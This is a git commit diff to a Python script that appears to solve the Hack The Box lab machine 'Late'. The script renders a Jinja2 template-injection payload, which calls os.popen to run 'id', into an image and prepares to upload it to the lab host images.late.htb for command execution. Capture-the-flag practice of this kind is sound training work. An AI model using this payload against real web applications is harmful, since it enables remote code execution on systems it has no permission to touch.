fb0fb441da106f1b4adc3d9cdf4cb5b42de0d0da
OMaR al-ahmadi <53053907+Archx1@users.noreply.github.com>
2022-05-07 19:22:01 +0300

    Update solevHTB.py

--- solevHTB.py
+++ solevHTB.py
@@ -7,16 +7,18 @@ from PIL import ImageFont
 from PIL import ImageDraw 
 import os
 
+url = "http://images.late.htb"
+
+# generate img
 img = Image.open("img/arch1.jpg")
 draw = ImageDraw.Draw(img)
 font = ImageFont.truetype("font/consolaz.ttf", 30)
 draw.text((10, 250),""" {{ config.__class__.__init__.__globals__['os'].popen(' id ').read()}}""",(1,1,1),font=font)
 
-
 img.save('img/bb2-out.jpg')
-# img.show()
+# img.show() 
 
-url = "http://images.late.htb"
+# send img
 image = open('img/bb2-out.jpg','rb').read()
 filename = "Arch.png"
 files ={"file":(filename,image)}
